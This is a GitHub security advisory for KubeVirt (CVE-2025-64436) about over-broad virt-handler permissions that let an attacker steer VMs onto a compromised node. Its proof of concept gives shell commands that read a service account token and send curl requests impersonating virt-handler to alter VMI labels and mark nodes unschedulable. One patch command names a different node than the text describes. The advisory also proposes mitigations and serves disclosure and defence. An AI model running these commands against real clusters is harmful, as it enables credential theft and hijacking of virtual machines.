# [M] KubeVirt Excessive Role Permissions Could Enable Unauthorized VMI Migrations Between Nodes

## Summary
Severity: Medium
Advisory: GHSA-7xgm-5prm-v5gc
CVE: CVE-2025-64436
CWE: CWE-269, CWE-276
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2025-11-06
Source: https://github.com/advisories/GHSA-7xgm-5prm-v5gc
Type: github-advisory

## Affected
- Go: `kubevirt.io/kubevirt` — affected >=0 <1.7.0

## Details
### Summary

The permissions granted to the `virt-handler` service account, such as the ability to update VMI and patch nodes, could be abused to force a VMI migration to an attacker-controlled node.

### Details

Following the [GitHub security advisory published on March 23 2023](https://github.com/kubevirt/kubevirt/security/advisories/GHSA-cp96-jpmq-xrr2), a `ValidatingAdmissionPolicy` was introduced to impose restrictions on which sections of node resources the `virt-handler` service account can modify. For instance, the `spec` section of nodes has been made immutable, and modifications to the `labels` section are now limited to `kubevirt.io`-prefixed labels only. This vulnerability could otherwise allow an attacker to mark all nodes as unschedulable, potentially forcing the migration or creation of privileged pods onto a compromised node.


However, if a `virt-handler` service account is compromised, either through the pod itself or the underlying node, an attacker may still modify node labels, both on the compromised node and on other nodes within the cluster. Notably, `virt-handler` sets a specific `kubevirt.io` boolean label, `kubevirt.io/schedulable`, which indicates whether the node can host VMI workloads. An attacker could repeatedly patch other nodes by setting this label to `false`, thereby forcing all #acr("vmi") instances to be scheduled exclusively on the compromised node.

[Another finding](https://github.com/kubevirt/kubevirt/security/advisories/GHSA-ggp9-c99x-54gp) describes how a compromised `virt-handler` instance can perform operations on other nodes that are intended to be executed solely by `virt-api`. This significantly increases both the impact and the likelihood of the vulnerability being exploited


Additionally, by default, the `virt-handler` service account has permission to update all VMI resources across the cluster, including those not running on the same node. While a security mechanism similar to the kubelet's `NodeRestriction` feature exists to limit this scope, it is controlled by a feature gate and is therefore not enabled by default.



### PoC

By injecting incorrect data into a running VMI, for example, by altering the `kubevirt.io/nodeName` label to reference a different node, the VMI is marked as terminated and its state transitions to `Succeeded`. This incorrect state could mislead an administrator into restarting the VMI, causing it to be re-created on a node of the attacker's choosing. As an example, the following demonstrates how to instantiate a basic VMI:

```yaml
apiVersion: kubevirt.io/v1
kind: VirtualMachine
metadata:
  name: testvm
spec:
  runStrategy: Always
  template:
    metadata:
      labels:
        kubevirt.io/size: small
        kubevirt.io/domain: testvm
    spec:
      domain:
        devices:
          disks:
            - name: containerdisk
              disk:
                bus: virtio
            - name: cloudinitdisk
              disk:
                bus: virtio
          interfaces:
          - name: default
            masquerade: {}
        resources:
          requests:
            memory: 64M
      networks:
      - name: default
        pod: {}
      volumes:
        - name: containerdisk
          containerDisk:
            image: quay.io/kubevirt/cirros-container-disk-demo
        - name: cloudinitdisk
          cloudInitNoCloud:
            userDataBase64: SGkuXG4=
```

The VMI is then created on a minikube node identified with `minikube-m02`:

```bash
operator@minikube:~$ kubectl get vmi testvm
NAME     AGE   PHASE     IP           NODENAME       READY
testvm   20s   Running   10.244.1.8   minikube-m02   True
```

Assume that a `virt-handler` pod, running on node `minikube-m03`, is compromised and an attacker and the latter wants the `testvm` to be re-deployed on a controlled by them node.

First, we retrieve the `virt-handler` service account token in order to be able to perform requests to the Kubernetes API:

```bash
# Get the `virt-handler` pod name
attacker@minikube-m03:~$ kubectl get pods  -n kubevirt --field-selector spec.nodeName=minikube-m03 | grep virt-handler
virt-handler-kblgh               1/1     Running   0          8d
# get the `virt-handler` SA account token
attacker@minikube-m03:~$ token=$(kubectl exec -it virt-handler-kblgh -n kubevirt -c virt-handler -- cat /var/run/secrets/kubernetes.io/serviceaccount/token) 
```

The attacker updates the VMI object labels in a way that makes it terminate:

```bash
# Save the current state of the VMI
attacker@minikube-m03:~$ kubectl get vmi testvm -o json > testvm.json
# replace the current `nodeName` to another one in the JSON file
attacker@minikube-m03:~$ sed -i 's/"kubevirt.io\/nodeName": "minikube-m02"/"kubevirt.io\/nodeName": "minikube-m03"/g' testvm.json 
# Perform the UPDATE request, impersonating the virt-handler
attacker@minikube-m03:~$ curl https://192.168.49.2:8443/apis/kubevirt.io/v1/namespaces/default/virtualmachineinstances/testvm -k  -X PUT -d @testvm.json -H "Content-Type: application/json" -H "Authorization: bearer $token"
# Get the current state of the VMI after the UPDATE
attacker@minikube-m03:~$ kubectl get vmi testvm
NAME     AGE   PHASE     IP           NODENAME       READY
testvm   42m   Running   10.244.1.8   minikube-m02   False # The VMI is not ready anymore
# Get the current state of the pod after the UPDATE
attacker@minikube-m03:~$ kubectl get pods | grep launcher
virt-launcher-testvm-z2fk4   0/3     Completed   0          44m  # the `virt-launcher` pod is completed
```

Now, the attacker can use the excessive permissions of the `virt-handler` service account to patch the `minikube-m02` node in order to mark it as unschedulable for VMI workloads:

```bash
attacker@minikube-m03:~$ curl https://192.168.49.2:8443/api/v1/nodes/minikube-m03 -k -H "Authorization: Bearer $token" -H "Content-Type: application/strategic-merge-patch+json" --data '{"metadata":{"labels":{"kubevirt.io/schedulable":"false"}}}' -X PATCH
```

**Note: This request could require multiple invocations as the `virt-handler` is continuously updating the schedulable state of the node it is running on**.

Finally, an admin user decides to restart the VMI:

```bash
admin@minikube:~$ kubectl delete -f testvm.yaml
admin@minikube:~$ kubectl apply -f testvm.yaml
admin@minikube:~$ kubectl get vmi testvm
NAME     AGE   PHASE     IP            NODENAME       READY
testvm   80s   Running   10.244.0.15   minikube-m03   True
```

Identifying the origin node of a request is not a straightforward task. One potential solution is to embed additional authentication data, such as the `userInfo` object, indicating the node on which the service account is currently running. This approach would be similar to Kubernetes' `NodeRestriction` feature gate. Since Kubernetes version 1.32, the `node` authorization mode, enforced via the `NodeRestriction` admission plugin, is enabled by default for kubelets running in the cluster. The equivalent feature gate in KubeVirt should likewise be enabled by default when the underlying Kubernetes version is 1.32 or higher.

An alternative approach would be to create a dedicated `virt-handler` service account for each node, embedding the node name into the account identity. This would allow the origin node to be inferred from the `userInfo.username` field of the `AdmissionRequest` object. However, this method introduces additional operational overhead in terms of monitoring and maintenance.


### Impact

This vulnerability could otherwise allow an attacker to mark all nodes as unschedulable, potentially forcing the migration or creation of privileged pods onto a compromised node.

## References
- https://github.com/kubevirt/kubevirt/security/advisories/GHSA-7xgm-5prm-v5gc
- https://nvd.nist.gov/vuln/detail/CVE-2025-64436
- https://github.com/kubevirt/kubevirt
